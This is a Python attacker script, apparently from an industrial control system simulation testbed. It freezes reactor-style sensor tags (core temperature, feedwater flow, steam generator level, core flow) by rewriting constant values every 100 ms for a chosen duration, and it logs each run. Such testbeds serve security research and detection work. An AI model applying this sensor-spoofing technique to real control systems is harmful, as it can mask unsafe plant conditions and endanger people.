#!/usr/bin/env python3
"""
AttackerSensorFreeze.py

Simple attacker that freezes one or more sensor tags by repeatedly writing a constant
value to the tag(s) for a given duration.

Usage:
    python AttackerSensorFreeze.py

Notes:
- This script assumes AttackerBase (Runnable) exposes a _set(tag_name, value) method
  (consistent with other Runnable/HMI/PLC classes in this project).
- If your runtime requires a connector (e.g. ActuatorConnector) instead, replace the
  self._set(...) calls with connector.set(...) or similar — see the comment below.
"""

import time
from datetime import datetime, timedelta
from AttackerBase import AttackerBase
from Configs import TAG, Connection
import logging
import os
import json

DEFAULT_TARGETS = [
    TAG.TAG_CORE_TEMP_OUT_VALUE,
    TAG.TAG_SG_FEEDWATER_FLOW_VALUE,
    TAG.TAG_SG_LEVEL_VALUE,
    TAG.TAG_CORE_FLOW_VALUE,
]

class AttackerSensorFreeze(AttackerBase):
    def __init__(self):
        super().__init__('attacker_sensor_freeze')
        # make a simple per-run logger file (also AttackerBase has attack_history)
        self.log_path = os.path.join('.', 'logs', 'attack-logs')
        if not os.path.exists(self.log_path):
            os.makedirs(self.log_path)

        filename = os.path.join(self.log_path, f'log-sensor-freeze-{int(time.time())}.txt')
        self.run_logger = self.setup_logger('sensor_freeze_run', logging.Formatter('%(message)s'),
                                            file_dir=self.log_path, file_ext=f'.txt')
        # write header
        self.run_logger.info("timestamp,action,tag,value,duration_s")

    def _prompt(self, prompt, default=None):
        try:
            rv = input(prompt)
        except KeyboardInterrupt:
            rv = ''
        if rv is None or rv == '':
            return default
        return rv

    def _logic(self):
        # 1) interactively select tag(s)
        print("\nAvailable default targets (you may enter a comma-separated list or press Enter to use defaults):")
        for i, t in enumerate(DEFAULT_TARGETS):
            print(f"  {i+1}) {t}")
        raw = self._prompt("Enter tag name(s) to freeze (or press Enter for defaults): ", "")
        if not raw:
            targets = DEFAULT_TARGETS.copy()
        else:
            # allow comma separated
            targets = [t.strip() for t in raw.split(',') if t.strip()]

        # verify existence in TAG.TAG_LIST (best-effort)
        valid_targets = []
        for t in targets:
            if t in TAG.TAG_LIST:
                valid_targets.append(t)
            else:
                # try tolerant match: if user passed short form like "core_temp_out"
                # attempt to find a matching key by suffix/prefix
                matches = [k for k in TAG.TAG_LIST if t in k]
                if len(matches) == 1:
                    valid_targets.append(matches[0])
                elif len(matches) > 1:
                    self.report(f"Ambiguous shorthand '{t}', matches: {matches}", logging.WARNING)
                else:
                    self.report(f"Unknown tag '{t}' - skipping", logging.WARNING)

        if not valid_targets:
            self.report("No valid targets selected - aborting.")
            return

        # 2) duration
        d_raw = self._prompt("Freeze duration in seconds (default 30): ", "30")
        try:
            duration_s = float(d_raw)
        except Exception:
            duration_s = 30.0

        # 3) decide value: use current reading or enter new one
        val_choice = self._prompt("Freeze to (1) current value, (2) enter constant? [1/2] (default 1): ", "1")
        freeze_values = {}
        if str(val_choice).strip() == '2':
            # ask each or single constant
            const_raw = self._prompt("Enter constant value to use for all targets (or press Enter to set per-target): ", "")
            if const_raw != "":
                # try parse as float or keep string
                try:
                    const_val = float(const_raw)
                except Exception:
                    const_val = const_raw
                for t in valid_targets:
                    freeze_values[t] = const_val
            else:
                for t in valid_targets:
                    cur = self._receive_safe(t)
                    val_raw = self._prompt(f"Value for {t} (current={cur}) : ", str(cur))
                    try:
                        val = float(val_raw)
                    except Exception:
                        val = val_raw
                    freeze_values[t] = val
        else:
            # read current values now and freeze to them
            for t in valid_targets:
                cur = self._receive_safe(t)
                freeze_values[t] = cur

        # Confirm summary
        self.report("Attack summary:")
        for t in valid_targets:
            self.report(f"  freeze {t} -> {freeze_values[t]}")
        self.report(f"Duration: {duration_s} seconds")

        start_ts = datetime.now()
        end_ts = start_ts + timedelta(seconds=duration_s)

        self.report(f"Starting sensor-freeze at {start_ts} for {duration_s}s", logging.INFO)
        self.run_logger.info(f"{start_ts.isoformat()},start_freeze,{json.dumps(valid_targets)},{json.dumps(freeze_values)},{duration_s}")

        # 4) apply freeze: repeatedly write the chosen value for duration
        write_interval = 0.1  # seconds (100 ms)
        next_write = time.time()
        writes = 0
        try:
            while time.time() < end_ts.timestamp():
                now = time.time()
                if now >= next_write:
                    for t in valid_targets:
                        v = freeze_values[t]
                        # write to tag
                        try:
                            self._set(t, v)   # <-- uses Runnable/AttackerBase write API
                            writes += 1
                        except Exception as e:
                            # If _set isn't available in Runnable in your installation,
                            # you can fallback to using ActuatorConnector directly:
                            # from ics_sim.Device import ActuatorConnector
                            # conn = ActuatorConnector(Connection.CONNECTION)
                            # conn.write_tag(TAG.TAG_LIST[t]['id'], v)  # (example API)
                            self.report(f"Write failed for {t}: {e}", logging.ERROR)
                    next_write = now + write_interval
                time.sleep(0.02)
        except KeyboardInterrupt:
            self.report("Interrupted by user", logging.WARNING)

        finish_ts = datetime.now()
        self.run_logger.info(f"{finish_ts.isoformat()},end_freeze,{json.dumps(valid_targets)},{json.dumps(freeze_values)},{duration_s}")
        self.report(f"Finished sensor-freeze at {finish_ts} (wrote {writes} set operations)", logging.INFO)

        # done once — exit run loop
        return

    def _receive_safe(self, tag):
        try:
            val = self._receive(tag)
        except Exception:
            try:
                val = self._get(tag)
            except Exception:
                val = None
        return val


if __name__ == '__main__':
    attacker = AttackerSensorFreeze()
    attacker.start()
